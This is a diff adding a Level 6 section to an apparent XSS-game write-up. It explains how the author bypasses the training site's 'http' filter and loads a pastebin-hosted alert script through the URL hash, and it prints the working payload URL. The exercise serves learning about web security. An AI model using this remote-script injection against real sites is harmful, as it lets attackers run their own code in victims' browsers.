@@ -52,7 +52,23 @@ Originally I tried injecting new things into the sign up bar, just like the prev
 
 ### Level 6
 
-For this problem I realized that the only 
+For this level I realized that the only way to solve I was to manipulate the URL in some way so that it would run a external script. Glancing over the code I realized that the application was checking for any inputs containing ```http``` or ```https```, I also saw this block of code:
+
+```
+// Take the value after # and use it as the gadget filename.
+    function getGadgetName() { 
+      return window.location.hash.substr(1) || "/static/gadget.js";
+    }
+```
+
+that led me to believe that I could use a site like pastebin to host my code, which would simply be comprised of ```alert("Hello")``` and then paste it in after ```frame#``` to get the solution, using this I was able to pass this level:
+
+```https://xss-game.appspot.com/level6/frame#//pastebin.com/raw/9sjtF2zG```
+
+
+Here is the final picture!:
+
+![alt text]()
 
 
 
